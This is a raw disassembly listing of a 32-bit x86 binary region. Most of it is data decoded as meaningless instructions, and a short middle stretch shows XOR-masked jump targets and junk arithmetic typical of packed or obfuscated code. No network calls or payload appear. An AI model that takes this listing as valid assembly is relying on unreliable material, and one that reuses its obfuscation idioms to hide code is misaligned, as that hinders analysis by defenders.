  40f192:	jg     0x40f177
  40f194:	mov    al,0x8f
  40f196:	sbb    BYTE PTR [edx],ch
  40f198:	xor    ah,al
  40f19a:	dec    ebp
  40f19b:	jp     0x40f1de
  40f19d:	loop   0x40f199
  40f19f:	adc    edi,DWORD PTR [ecx]
  40f1a1:	push   0xb846e52a
  40f1a6:	data16 jle 0x40f1ca
  40f1a9:	leave  
  40f1aa:	inc    ecx
  40f1ab:	loopne 0x40f226
  40f1ad:	jge    0x40f22d
  40f1af:	aad    0x1d
  40f1b1:	repnz add eax,0x5ae1be00
  40f1b7:	push   0xffffffcb
  40f1b9:	push   ebp
  40f1ba:	rcl    BYTE PTR [edx],0xc0
  40f1bd:	bound  ebx,QWORD PTR [edx+0x2c8382e7]
  40f1c3:	jnp    0x40f231
  40f1c5:	or     DWORD PTR [ebp+0x78],esp
  40f1c8:	dec    ecx
  40f1c9:	shl    BYTE PTR fs:[edi+edi*4+0x7a86758b],1
  40f1d1:	(bad)  
  40f1d3:	add    BYTE PTR [eax-0x78],cl
  40f1d6:	fisttp DWORD PTR [ebp+0x4]
  40f1d9:	mov    al,ds:0x9e27d8bb
  40f1de:	jp     0x40f17d
  40f1e0:	sub    esi,ebp
  40f1e2:	push   ss
  40f1e3:	adc    edx,DWORD PTR [ebx+edx*4+0x7c]
  40f1e7:	into   
  40f1e8:	add    ebp,DWORD PTR [ecx-0x73]
  40f1eb:	adc    DWORD PTR [ebx-0x16060eb7],0xffffffbe
  40f1f2:	mov    edi,0x8c66e6ac
  40f1f7:	daa    
  40f1f8:	push   es
  40f1f9:	xor    eax,0x1df25ed8
  40f1fe:	push   ebx
  40f1ff:	dec    edi
  40f200:	jmp    0x4787:0x8aa455da
  40f207:	dec    esi
  40f208:	imul   ebp,ebx,0xecf710a8
  40f20e:	pop    eax
  40f20f:	mov    ecx,0x3646cd08
  40f214:	xchg   ecx,eax
  40f215:	sbb    esp,esi
  40f217:	repz xchg esi,eax
  40f219:	mov    dl,0x38
  40f21b:	xchg   ecx,eax
  40f21c:	mov    eax,0xc1be0eb9
  40f221:	clc    
  40f222:	jge    0x40f1d7
  40f224:	into   
  40f225:	loope  0x40f246
  40f227:	lea    edx,[ecx-0x1]
  40f22a:	aam    0xf7
  40f22c:	loop   0x40f281
  40f22e:	xchg   ebx,eax
  40f22f:	pop    es
  40f230:	pop    eax
  40f231:	add    esp,DWORD PTR ds:0x371ce120
  40f237:	dec    ebx
  40f238:	in     al,0x8a
  40f23a:	cmp    ah,0xd9
  40f23d:	push   ebp
  40f23e:	mov    al,0xf9
  40f240:	leave  
  40f241:	mov    esp,0x2413b4b
  40f246:	add    dh,ch
  40f248:	mov    edi,0xdb9c0b4b
  40f24d:	pop    edx
  40f24e:	add    BYTE PTR [ebx+0x19],dh
  40f251:	scas   eax,DWORD PTR es:[edi]
  40f252:	hlt    
  40f253:	std    
  40f254:	push   edi
  40f255:	mov    al,0xb1
  40f257:	(bad)  
  40f258:	cmp    al,BYTE PTR [ecx-0x7ae2c944]
  40f25e:	jge    0x40f202
  40f260:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f261:	sub    DWORD PTR [esi+eiz*4],eax
  40f264:	or     al,0xdd
  40f266:	scas   al,BYTE PTR es:[edi]
  40f267:	jnp    0x40f26c
  40f269:	and    ebx,DWORD PTR [ebx-0x7e70e398]
  40f26f:	and    DWORD PTR [ebx],0xffffffcc
  40f272:	mov    ax,0xbcbb
  40f276:	ins    DWORD PTR es:[edi],dx
  40f277:	xor    esp,DWORD PTR [edx]
  40f279:	in     eax,dx
  40f27a:	mov    DWORD PTR [edi+0x0],edx
  40f27d:	pop    es
  40f27e:	push   ebx
  40f27f:	mov    al,ds:0x2c9f9dc9
  40f284:	lock pop eax
  40f286:	rol    DWORD PTR [eax],0xc5
  40f289:	popa   
  40f28a:	jecxz  0x40f20c
  40f28c:	(bad)  
  40f28d:	int3   
  40f28e:	(bad)  
  40f290:	push   ss
  40f291:	popf   
  40f292:	mov    ecx,0xfa263995
  40f297:	cmc    
  40f298:	cmp    al,0x1a
  40f29a:	and    eax,DWORD PTR [edi]
  40f29c:	stos   DWORD PTR es:[edi],eax
  40f29d:	mov    al,0xa3
  40f29f:	dec    ecx
  40f2a0:	mov    WORD PTR [eax+0x41a35741],ss
  40f2a6:	add    al,0x25
  40f2a8:	mov    dh,dl
  40f2aa:	icebp  
  40f2ab:	xor    BYTE PTR [esi],0x86
  40f2ae:	add    ebp,DWORD PTR [esi-0x485157fc]
  40f2b4:	fist   DWORD PTR [edx+0x1a]
  40f2b7:	in     al,0xe0
  40f2b9:	(bad)  
  40f2ba:	in     al,0x72
  40f2bc:	lds    esp,FWORD PTR [ecx]
  40f2be:	ins    BYTE PTR es:[edi],dx
  40f2bf:	mov    ds:0x999abdb3,al
  40f2c4:	inc    eax
  40f2c5:	(bad)  {z}
  40f2ca:	pop    ebx
  40f2cb:	jno    0x40f255
  40f2cd:	test   DWORD PTR [edi],edx
  40f2cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2d0:	xor    al,0xa1
  40f2d2:	push   edi
  40f2d3:	cld    
  40f2d4:	mov    cl,0x1c
  40f2d6:	in     al,0x75
  40f2d8:	sub    BYTE PTR [eax],cl
  40f2da:	pop    esi
  40f2db:	xchg   ebp,eax
  40f2dc:	xchg   esi,eax
  40f2dd:	out    dx,al
  40f2de:	jne    0x40f2a7
  40f2e0:	in     eax,0x37
  40f2e2:	out    0xe1,al
  40f2e4:	or     ax,0x40b3
  40f2e8:	setne  bh
  40f2eb:	mov    al,0x8d
  40f2ed:	leave  
  40f2ee:	push   ecx
  40f2ef:	and    BYTE PTR [esi+eiz*1+0x54],bl
  40f2f3:	xor    al,0x87
  40f2f5:	jge    0x40f2d5
  40f2f7:	jo     0x40f28b
  40f2f9:	push   edx
  40f2fa:	inc    edx
  40f2fb:	ret    0xea1d
  40f2fe:	mov    eax,ds:0xf2a23f9a
  40f303:	add    dh,ah
  40f305:	adc    eax,0x64e6bc9c
  40f30a:	mov    dh,0xe1
  40f30c:	aam    0x9c
  40f30e:	popa   
  40f30f:	rcl    BYTE PTR [ebp+0x5d],cl
  40f312:	mov    dl,0x1d
  40f314:	lods   eax,DWORD PTR ds:[esi]
  40f315:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f316:	fistp  QWORD PTR ds:0xb019cb35
  40f31c:	push   cs
  40f31d:	mov    dl,0x2
  40f31f:	mov    bl,0xdd
  40f321:	addr16 (bad) 
  40f323:	fcmovne st,st(2)
  40f325:	adc    eax,0xfc8f1d5
  40f32a:	ins    DWORD PTR es:[edi],dx
  40f32b:	xchg   esi,eax
  40f32c:	ror    BYTE PTR [edx],cl
  40f32e:	lods   eax,DWORD PTR ds:[esi]
  40f32f:	(bad)  
  40f330:	and    eax,0xc9023e7c
  40f335:	inc    ebx
  40f336:	adc    DWORD PTR [eax],eax
  40f338:	xchg   esi,eax
  40f339:	retf   
  40f33a:	mov    cl,0xb4
  40f33c:	in     eax,0x72
  40f33e:	sbb    eax,0x8f697f90
  40f343:	stos   DWORD PTR es:[edi],eax
  40f344:	arpl   WORD PTR [edi-0x59fdcc49],ax
  40f34a:	mov    DWORD PTR [esi-0x680326d5],ecx
  40f350:	loopne 0x40f2fd
  40f352:	or     esp,DWORD PTR [ebp-0x3079f6ac]
  40f358:	je     0x40f302
  40f35a:	icebp  
  40f35b:	ret    
  40f35c:	mov    cs,WORD PTR [edi]
  40f35e:	std    
  40f35f:	push   esi
  40f360:	pop    eax
  40f361:	mov    edx,0x6d46aec4
  40f366:	lds    esi,FWORD PTR [edx+0x66]
  40f369:	inc    ebx
  40f36a:	adc    DWORD PTR [ebp-0x76],edx
  40f36d:	dec    esi
  40f36e:	cmc    
  40f36f:	mov    gs,esi
  40f371:	inc    esp
  40f372:	push   0x36
  40f374:	xchg   edi,eax
  40f375:	out    0x5f,al
  40f377:	lds    esi,FWORD PTR [esi]
  40f379:	imul   ebp,DWORD PTR [ecx],0xffffffdb
  40f37c:	xchg   ecx,eax
  40f37d:	add    edx,DWORD PTR [ebx]
  40f37f:	imul   eax,DWORD PTR [esp+esi*2],0x32
  40f383:	xchg   esp,eax
  40f384:	inc    ecx
  40f385:	pop    ss
  40f386:	mov    ecx,ebp
  40f388:	mov    bl,BYTE PTR [ecx-0x7]
  40f38b:	jns    0x40f334
  40f38d:	cli    
  40f38e:	pop    ds
  40f38f:	dec    ebx
  40f390:	call   0xf4ed:0x91031086
  40f397:	fstp   DWORD PTR [edi+0x49a1e0cd]
  40f39d:	ins    DWORD PTR es:[edi],dx
  40f39e:	jmp    0x40f401
  40f3a0:	jge    0x40f337
  40f3a2:	aas    
  40f3a3:	gs dec esp
  40f3a5:	js     0x40f3fc
  40f3a7:	(bad)  [ecx-0x5405ff2a]
  40f3ad:	test   eax,0xca9dcca9
  40f3b2:	gs gs mov edx,es
  40f3b6:	dec    ecx
  40f3b7:	xchg   ebx,eax
  40f3b8:	sbb    BYTE PTR [eax+0x791cba74],0x85
  40f3bf:	dec    esi
  40f3c0:	sub    bl,BYTE PTR es:[ebx+0x467d1703]
  40f3c7:	inc    esp
  40f3c8:	int3   
  40f3c9:	mov    ebp,0xb89334df
  40f3ce:	ins    DWORD PTR es:[edi],dx
  40f3cf:	push   ds
  40f3d0:	hlt    
  40f3d1:	jp     0x40f444
  40f3d3:	fisubr DWORD PTR [ebp-0x21]
  40f3d6:	jne    0x40f3ef
  40f3d8:	push   0x7be9029c
  40f3dd:	test   ecx,ebx
  40f3df:	pop    ebp
  40f3e0:	mov    eax,ds:0xca0b0b35
  40f3e5:	jae    0x40f451
  40f3e7:	mov    cl,dl
  40f3e9:	(bad)  
  40f3ea:	neg    BYTE PTR [ebx+ecx*8+0x7f]
  40f3ee:	out    dx,eax
  40f3ef:	cmp    DWORD PTR [ebp+0x72714f47],eax
  40f3f5:	lods   al,BYTE PTR ds:[esi]
  40f3f6:	shr    BYTE PTR [ebp-0x6c1401b5],1
  40f3fc:	popf   
  40f3fd:	sbb    BYTE PTR [ecx+0x58],dl
  40f400:	mov    DWORD PTR [edx+0x64],eax
  40f403:	sbb    BYTE PTR [esi-0x634aa5b5],ah
  40f409:	push   ecx
  40f40a:	inc    esp
  40f40b:	inc    edi
  40f40c:	mov    bh,0xdc
  40f40e:	std    
  40f40f:	pop    esi
  40f410:	scas   eax,DWORD PTR es:[edi]
  40f411:	leave  
  40f412:	cs cli 
  40f414:	retf   0x3bbf
  40f417:	sub    al,0x12
  40f419:	mov    al,0x4c
  40f41b:	aas    
  40f41c:	fsubr  DWORD PTR [ebx]
  40f41e:	dec    eax
  40f41f:	add    DWORD PTR ds:0x3cf8627f,ebx
  40f425:	mov    WORD PTR [edx+0x58034946],?
  40f42b:	hlt    
  40f42c:	scas   al,BYTE PTR es:[edi]
  40f42d:	mov    ah,0x92
  40f42f:	pop    ebx
  40f430:	add    al,0x86
  40f432:	pop    es
  40f433:	es push edx
  40f435:	mov    al,0xda
  40f437:	inc    eax
  40f438:	push   ss
  40f439:	call   0x7455:0xc7482c55
  40f440:	add    eax,0x97f253a9
  40f445:	or     ecx,DWORD PTR [eax]
  40f447:	test   al,0xf
  40f449:	pop    ebp
  40f44a:	sub    eax,0xb9f700c7
  40f44f:	arpl   WORD PTR [edx-0x6522a556],ax
  40f455:	mov    WORD PTR [ebx-0x6356fcb6],fs
  40f45b:	xchg   esp,eax
  40f45c:	mov    dl,0x48
  40f45e:	xor    eax,ecx
  40f460:	fsub   QWORD PTR cs:[ebx-0x60]
  40f464:	or     eax,0xdf8022cc
  40f469:	ret    
  40f46a:	cmc    
  40f46b:	dec    esi
  40f46c:	dec    ebx
  40f46d:	addr16 js 0x40f467
  40f470:	imul   ecx,ebp,0xffffffec
  40f473:	lea    esp,[esi-0x41]
  40f476:	mov    gs,WORD PTR [edi-0x3a05335a]
  40f47c:	add    ecx,DWORD PTR [ebp-0x1f]
  40f47f:	inc    esp
  40f480:	jecxz  0x40f46c
  40f482:	jmp    0x40f48c
  40f484:	dec    esp
  40f485:	and    DWORD PTR [edx+0x7df8a1de],edi
  40f48b:	ret    0x7389
  40f48e:	retf   0x82a1
  40f491:	jae    0x40f496
  40f493:	jg     0x40f461
  40f495:	aas    
  40f496:	loopne 0x40f4b9
  40f498:	xchg   esi,eax
  40f499:	iret   
  40f49a:	push   es
  40f49b:	mov    BYTE PTR [edi-0x3dd95f97],0x37
  40f4a2:	rol    DWORD PTR [ebp+0xdc9458a],0xb9
  40f4a9:	inc    esp
  40f4aa:	pusha  
  40f4ab:	mov    ecx,0x6a068c13
  40f4b0:	and    al,0x26
  40f4b2:	jle    0x40f4c0
  40f4b4:	je     0x40f453
  40f4b6:	stc    
  40f4b7:	and    BYTE PTR [eax-0x52],al
  40f4ba:	pop    esi
  40f4bb:	sub    dl,BYTE PTR [esp+ebp*4]
  40f4be:	clc    
  40f4bf:	adc    al,0xb
  40f4c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4c2:	xor    cl,BYTE PTR [edi+eax*8]
  40f4c5:	sub    bl,BYTE PTR [edi]
  40f4c7:	je     0x40f542
  40f4c9:	xchg   esi,eax
  40f4ca:	add    DWORD PTR [eax],edx
  40f4cc:	cdq    
  40f4cd:	dec    ebp
  40f4ce:	and    DWORD PTR [ebx+edi*2-0x190822d2],edx
  40f4d5:	js     0x40f48f
  40f4d7:	add    BYTE PTR [esi-0x6276971d],0x4f
  40f4de:	or     BYTE PTR [edi],0xb3
  40f4e1:	mov    cl,0xe4
  40f4e3:	cmp    BYTE PTR [ecx+eax*1-0x5b90bae2],dl
  40f4ea:	dec    ebx
  40f4eb:	dec    eax
  40f4ec:	push   ebx
  40f4ed:	imul   ecx,DWORD PTR [eax],0x339e9bfc
  40f4f3:	dec    ebp
  40f4f4:	sub    edi,edx
  40f4f6:	xchg   edi,eax
  40f4f7:	out    dx,al
  40f4f8:	xchg   esp,eax
  40f4f9:	daa    
  40f4fa:	mov    ch,0x14
  40f4fc:	xor    DWORD PTR [esi+0x21],0xffffffec
  40f500:	sub    BYTE PTR [ebp+ecx*2-0x43ab3ae0],dh
  40f507:	js     0x40f4eb
  40f509:	pop    ds
  40f50a:	adc    DWORD PTR [edx],esp
  40f50c:	pop    edi
  40f50d:	mov    ebp,0xd58e8f68
  40f512:	jmp    FWORD PTR [esi+0x50]
  40f515:	xchg   edx,eax
  40f516:	call   0x2564bcb2
  40f51b:	and    eax,0x2ffce399
  40f520:	dec    ecx
  40f521:	mov    cl,0x89
  40f523:	cmp    eax,0xd6003316
  40f528:	mov    ebp,DWORD PTR [edx-0x1d7ea104]
  40f52e:	pushf  
  40f52f:	mov    ecx,0xb94fe89
  40f534:	sbb    eax,0x44ff2a7b
  40f539:	mov    ebp,0x1d1a5995
  40f53e:	pop    edx
  40f53f:	mov    al,ds:0x5b892c0d
  40f544:	adc    bl,BYTE PTR [ebx-0x1383082a]
  40f54a:	cld    
  40f54b:	repnz mov WORD PTR [ebp+0x13],ds
  40f54f:	sar    DWORD PTR [ebx+0x763c9014],cl
  40f555:	scas   eax,DWORD PTR es:[edi]
  40f556:	shl    esi,cl
  40f558:	pop    edi
  40f559:	ret    
  40f55a:	outs   dx,DWORD PTR ds:[esi]
  40f55b:	outs   dx,DWORD PTR ds:[esi]
  40f55c:	push   esi
  40f55d:	xchg   esi,eax
  40f55e:	in     al,0x3e
  40f560:	inc    eax
  40f561:	ror    BYTE PTR [edi-0x5f],1
  40f564:	mov    ds:0xda9b64c8,al
  40f569:	bound  esp,QWORD PTR [eax+edx*4-0x183efe2c]
  40f570:	ror    edi,cl
  40f572:	das    
  40f573:	(bad)  
  40f574:	pop    ecx
  40f575:	pop    edx
  40f576:	ja     0x40f4f8
  40f578:	cmc    
  40f579:	jbe    0x40f581
  40f57b:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40f57d:	mov    ebx,0x5810659a
  40f582:	retf   0x5ce
  40f585:	mov    esp,gs
  40f587:	xchg   BYTE PTR [esi],bh
  40f589:	add    dh,BYTE PTR [ecx-0x7cc4a768]
  40f58f:	sti    
  40f590:	popa   
  40f591:	(bad)  
  40f592:	std    
  40f593:	jmp    0xb312e354
  40f598:	mov    ecx,ebx
  40f59a:	pop    es
  40f59b:	xor    esp,ebx
  40f59d:	jle    0x40f56a
  40f59f:	cmp    dh,ah
  40f5a1:	sbb    BYTE PTR [edi-0x3c],dl
  40f5a4:	push   cs
  40f5a5:	sub    ch,bh
  40f5a7:	lds    ebx,FWORD PTR [edi-0x69e94bc4]
  40f5ad:	pop    es
  40f5ae:	and    DWORD PTR [ebx-0xe],ecx
  40f5b1:	mov    edx,0x8bc83b3c
  40f5b6:	inc    ebp
  40f5b7:	cld    
  40f5b8:	je     0x40f617
  40f5be:	mov    ecx,DWORD PTR [ebp-0x30]
  40f5c1:	xor    eax,esi
  40f5c3:	add    eax,edi
  40f5c5:	cmp    ecx,eax
  40f5c7:	je     0x40f620
  40f5cd:	lea    eax,[ebp-0x8]
  40f5d0:	push   eax
  40f5d1:	push   DWORD PTR [ebp-0x28]
  40f5d4:	push   DWORD PTR [ebp+0xc]
  40f5d7:	call   0x411bb3
  40f5dc:	mov    eax,DWORD PTR [ebp-0x4]
  40f5df:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5e2:	xor    eax,esi
  40f5e4:	add    eax,edi
  40f5e6:	cmp    ecx,eax
  40f5e8:	je     0x40f603
  40f5ee:	mov    eax,DWORD PTR [ebp-0x34]
  40f5f1:	movzx  eax,WORD PTR [eax+ebx*2]
  40f5f5:	mov    ecx,DWORD PTR [ebp-0x14]
  40f5f8:	mov    eax,DWORD PTR [ecx+eax*4]
  40f5fb:	mov    DWORD PTR [ebp-0x38],eax
  40f5fe:	jmp    0x40d1fa
  40f603:	mov    eax,DWORD PTR [ebp-0xc]
  40f606:	xor    eax,esi
  40f608:	lea    ebx,[ebx+eax*1+0x3272f6]
  40f60f:	jmp    0x40cf5b
  40f614:	mov    eax,DWORD PTR [ebp-0x4]
  40f617:	xor    eax,esi
  40f619:	add    eax,edi
  40f61b:	jmp    0x411aee
  40f620:	mov    eax,DWORD PTR [ebp-0x38]
  40f623:	add    eax,DWORD PTR [ebp+0x8]
  40f626:	mov    DWORD PTR [ebp-0x18],eax
  40f629:	mov    eax,DWORD PTR [ebp-0x1c]
  40f62c:	test   eax,eax
  40f62e:	je     0x411a77
  40f634:	mov    DWORD PTR [ebp-0x20],0x0
  40f63b:	push   0x3
  40f63d:	xor    edx,edx
  40f63f:	pop    edx
  40f640:	add    edx,0x8
  40f643:	push   edx
  40f644:	pop    ecx
  40f645:	push   0x6
  40f647:	dec    ecx
  40f648:	pop    ebx
  40f649:	dec    ebx
  40f64a:	xchg   ebx,ecx
  40f64c:	sub    ebx,ecx
  40f64e:	xchg   ebx,ecx
  40f650:	dec    ecx
  40f651:	mov    eax,DWORD PTR [ebp-0x1c]
  40f654:	imul   eax,ecx
  40f657:	sub    esp,eax
  40f659:	mov    DWORD PTR [ebp-0x20],esp
  40f65c:	mov    eax,DWORD PTR [ebp-0x4]
  40f65f:	xor    eax,esi
  40f661:	add    eax,edi
  40f663:	jmp    0x411a50
  40f668:	mov    ecx,DWORD PTR [ebp-0xc]
  40f66b:	mov    eax,DWORD PTR [ebp+0x8]
  40f66e:	mov    edx,DWORD PTR [ebp+0x14]
  40f671:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40f675:	jmp    0x411a24
  40f67a:	push   edi
  40f67b:	into   
  40f67c:	cmc    
  40f67d:	pop    ss
  40f67e:	in     al,0x4
  40f680:	xchg   ebp,eax
  40f681:	mov    ?,WORD PTR [edi+0x4b5c25fb]
  40f687:	in     al,dx
  40f688:	push   eax
  40f689:	mov    ebp,0x8383afc3
  40f68e:	icebp  
  40f68f:	pusha  
  40f690:	add    DWORD PTR [ebx-0x374b6976],0xffffffeb
  40f697:	js     0x40f6f0
  40f699:	imul   ebx,DWORD PTR [ebp-0x5e],0x9669da83
  40f6a0:	push   ss
  40f6a1:	add    ebp,DWORD PTR [edi-0xc]
  40f6a4:	iret   
  40f6a5:	adc    dl,BYTE PTR [ebx]
  40f6a7:	ins    BYTE PTR es:[edi],dx
  40f6a8:	inc    ebp
  40f6a9:	push   eax
  40f6aa:	jg     0x40f643
  40f6ac:	data16 arpl WORD PTR [eax-0x3e0eb21e],dx
  40f6b3:	lahf   
  40f6b4:	ret    
  40f6b5:	jo     0x40f6a0
  40f6b7:	ror    DWORD PTR [ebp-0x72ad7d9d],0xc1
  40f6be:	pop    edi
  40f6bf:	pop    ebx
  40f6c0:	and    eax,0xc248bdf9
  40f6c5:	loop   0x40f6ff
  40f6c7:	(bad)  
  40f6c8:	daa    
  40f6c9:	scas   al,BYTE PTR es:[edi]
  40f6ca:	push   ss
  40f6cb:	jns    0x40f733
  40f6cd:	mov    bh,0xfc
  40f6cf:	xor    ch,dh
  40f6d1:	call   0x1f1a:0xec885db9
  40f6d8:	(bad)  
  40f6d9:	mov    ebp,es
  40f6db:	or     DWORD PTR [esi+0x74],ecx
  40f6de:	xor    al,0x4
  40f6e0:	push   edx
  40f6e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6e2:	mov    ecx,0xcd7a9495
  40f6e7:	clc    
  40f6e8:	loopne 0x40f679
  40f6ea:	imul   ecx,DWORD PTR [eax+ecx*8],0xffffffe6
  40f6ee:	hlt    
  40f6ef:	test   al,0xf6
  40f6f1:	adc    al,0x36
  40f6f3:	mov    ds:0xee5cb4e,eax
  40f6f8:	fadd   DWORD PTR [ebx]
  40f6fa:	nop
  40f6fb:	adc    bh,ch
  40f6fd:	(bad)  
  40f6fe:	vpunpckhwd ymm2,ymm7,YMMWORD PTR [eax-0x5c231d4d]
  40f706:	lds    edi,FWORD PTR [ecx-0x34]
  40f709:	into   
  40f70a:	es sub al,al
  40f70d:	pop    ebp
  40f70e:	xchg   ebp,eax
  40f70f:	loope  0x40f6cc
  40f711:	popa   
  40f712:	jge    0x40f6ac
  40f714:	daa    
  40f715:	jge    0x40f71f
  40f717:	dec    edx
  40f718:	xadd   DWORD PTR [ebp+0x2954e065],ebp
  40f71f:	mov    dh,0xbd
  40f721:	sub    al,0x6c
  40f723:	inc    edi
  40f724:	pushf  
  40f725:	arpl   WORD PTR [ebx+ecx*2],bp
  40f728:	dec    edx
  40f729:	jne    0x40f723
  40f72b:	or     eax,0x2f657fbb
  40f730:	mov    bh,0x48
  40f732:	mov    BYTE PTR [ecx+0x5a],cl
  40f735:	or     DWORD PTR [edx],edi
  40f737:	js     0x40f705
  40f739:	sub    DWORD PTR [ebx+0x2ef10e7],eax
  40f73f:	inc    esi
  40f740:	retf   0xc099
  40f743:	dec    esp
  40f744:	int3   
  40f745:	sbb    DWORD PTR [ecx],esp
  40f747:	repnz push 0x3d84caa1
  40f74d:	jmp    0xb572:0x5165eeb2
  40f754:	repnz in eax,0x2c
  40f757:	add    BYTE PTR [ecx],0xd2
  40f75a:	add    eax,0xf806926b
  40f75f:	ret    0x1236
  40f762:	aad    0xff
  40f764:	mov    ds:0x9f8cde86,eax
  40f769:	ja     0x40f78a
  40f76b:	test   eax,0x10a7811
  40f770:	sub    esi,ecx
  40f772:	sub    DWORD PTR [esp+eax*8-0x480a8e7b],eax
  40f779:	and    edi,DWORD PTR [eax]
  40f77b:	mov    ebp,DWORD PTR [ebx-0xadbc4d]
  40f781:	gs cmp eax,0x6044902f
  40f787:	sbb    DWORD PTR [esi+0x6b],esi
  40f78a:	mov    dl,0x68
  40f78c:	sahf   
  40f78d:	or     al,0x93
  40f78f:	addr16 pop ebx
  40f791:	ins    DWORD PTR es:[edi],dx
  40f792:	adc    eax,0xfd6e4824
  40f797:	dec    edx
  40f798:	pop    edx
  40f799:	and    eax,0xa7eb0e46
  40f79e:	mov    bl,0xde
  40f7a0:	inc    edi
  40f7a1:	and    eax,0x8851589c
  40f7a6:	ror    BYTE PTR ds:0x603da16a,1
  40f7ac:	add    bl,BYTE PTR [ebp+0x3adbb6b4]
  40f7b2:	jae    0x40f801
  40f7b4:	mov    BYTE PTR [bp+si-0x4d21],al
  40f7b9:	js     0x40f7f0
  40f7bb:	xor    esp,ebp
  40f7bd:	lock mov edi,0xa1689014
  40f7c3:	xchg   esp,eax
  40f7c4:	mov    edx,0x2c21865a
  40f7c9:	pop    edi
  40f7ca:	enter  0x2814,0x91
  40f7ce:	xor    eax,0xc777eb6e
  40f7d3:	xor    dh,bl
  40f7d5:	jnp    0x40f775
  40f7d7:	add    DWORD PTR [ebx-0x63],esi
  40f7da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7db:	lods   al,BYTE PTR ds:[esi]
  40f7dc:	add    al,0x92
  40f7de:	add    eax,0xa0602fad
  40f7e3:	enter  0xab2d,0x34
  40f7e7:	arpl   WORD PTR [ecx-0x18],ax
  40f7ea:	mov    ebx,0xbb11ed71
  40f7ef:	test   edx,edx
  40f7f1:	into   
  40f7f2:	and    al,bl
  40f7f4:	pop    edi
  40f7f5:	or     DWORD PTR [edx-0x4ca286cb],edx
  40f7fb:	sbb    ebp,DWORD PTR [eax]
  40f7fd:	xchg   BYTE PTR [ebx+ebp*4-0x29c8013c],ah
  40f804:	leave  
  40f805:	pop    ecx
  40f806:	pop    ecx
  40f807:	jg     0x40f78a
  40f809:	out    0x14,al
  40f80b:	fcomip st,st(5)
  40f80d:	add    esp,DWORD PTR [edi+0x65]
  40f810:	(bad)  [eax+0x70]
  40f813:	jge    0x40f84e
  40f815:	shl    BYTE PTR [ecx-0xa29265a],1
  40f81b:	cld    
  40f81c:	mov    ds:0xcd57794c,al
  40f821:	pop    ss
  40f822:	xchg   esp,eax
  40f823:	fmul   QWORD PTR [edi+ebx*8]
  40f826:	lea    esp,[ebp+eax*1+0x5c33f9fa]
  40f82d:	or     BYTE PTR [edx-0x1eef5df6],ch
  40f833:	out    0xa4,eax
  40f835:	fistp  QWORD PTR [eax]
  40f837:	fs xchg esp,eax
  40f839:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f83a:	xchg   ebp,eax
  40f83b:	xchg   ebp,eax
  40f83c:	mov    ds:0x12b2ed1f,al
  40f841:	jecxz  0x40f89f
  40f843:	xchg   esp,eax
  40f844:	jo     0x40f827
  40f846:	mov    eax,0x584ef96
  40f84b:	jno    0x40f87e
  40f84d:	pop    ecx
  40f84e:	push   ebp
  40f84f:	aam    0x66
  40f851:	into   
  40f852:	cs (bad) 
  40f856:	mov    ds:0x7373d308,al
  40f85b:	nop
  40f85c:	sbb    eax,0xaf891b62
  40f861:	sbb    eax,0xa14bd071
  40f866:	mov    ds:0x6bbb01e9,eax
  40f86b:	out    dx,al
  40f86c:	enter  0xfb73,0x3a
  40f870:	push   sp
  40f872:	dec    esi
  40f873:	scas   eax,DWORD PTR es:[edi]
  40f874:	je     0x40f847
  40f876:	push   eax
  40f877:	jb     0x40f830
  40f879:	int3   
  40f87a:	outs   dx,BYTE PTR ds:[esi]
  40f87b:	imul   esi,DWORD PTR [edx+0x33edf185],0xffffff9a
  40f882:	repnz cmp al,0xc6
  40f885:	adc    ebx,DWORD PTR [ecx]
  40f887:	das    
  40f888:	inc    edi
  40f889:	lods   al,BYTE PTR ds:[esi]
  40f88a:	ret    
  40f88b:	dec    ebp
  40f88c:	push   es
  40f88d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f88e:	xchg   BYTE PTR [ebp+0x389df345],cl
  40f894:	retf   0xb143
  40f897:	rol    BYTE PTR [ecx],cl
  40f899:	lahf   
  40f89a:	push   ebp
  40f89b:	inc    ebx
  40f89c:	pop    ebp
  40f89d:	adc    BYTE PTR [esi],ah
  40f89f:	dec    ebx
  40f8a0:	add    dl,BYTE PTR [ebx]
  40f8a2:	inc    edx
  40f8a3:	test   al,0x9a
  40f8a5:	ret    0x2ea3
  40f8a8:	jns    0x40f8b7
  40f8aa:	push   ds
  40f8ab:	fidiv  DWORD PTR [ebx-0x24]
  40f8ae:	mov    ebp,0x62572d46
  40f8b3:	mov    dl,0xd0
  40f8b5:	dec    edx
  40f8b6:	fldenv [esi-0x296a9dd2]
  40f8bc:	or     DWORD PTR [ebx-0x47],edi
  40f8bf:	call   0xa3763338
  40f8c4:	lods   eax,DWORD PTR ds:[esi]
  40f8c5:	es dec edx
  40f8c7:	add    eax,0x69b8e70f
  40f8cc:	repz mov edi,0x7b8ca941
  40f8d2:	sub    al,0x75
  40f8d4:	sbb    al,0x46
  40f8d6:	or     DWORD PTR [ecx],esp
  40f8d8:	lahf   
  40f8d9:	repz xor eax,0xec45a669
  40f8df:	mov    al,ds:0xe289112c
  40f8e4:	retf   0x8851
  40f8e7:	xor    al,0x67
  40f8e9:	aaa    
  40f8ea:	(bad)  
  40f8eb:	int    0x3c
  40f8ed:	jmp    0x40f95e
  40f8ef:	mov    DWORD PTR [ebx+0x30],edx
  40f8f2:	fld    QWORD PTR [eax]
  40f8f4:	in     eax,dx
  40f8f5:	inc    edi
  40f8f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8f7:	and    ebp,DWORD PTR [edi+0x44]
  40f8fa:	sbb    ecx,edx
  40f8fc:	dec    ecx
  40f8fd:	loope  0x40f8a1
  40f8ff:	scas   al,BYTE PTR es:[edi]
  40f900:	dec    DWORD PTR [ebp+0x5ff3abdd]
  40f906:	xchg   BYTE PTR [eax+esi*2-0x6bcada36],al
  40f90d:	dec    ebx
  40f90e:	gs aam 0x54
  40f911:	in     al,dx
  40f912:	mov    ebp,0x5bb1fe5f
  40f917:	lahf   
  40f918:	jmp    0xdd76f422
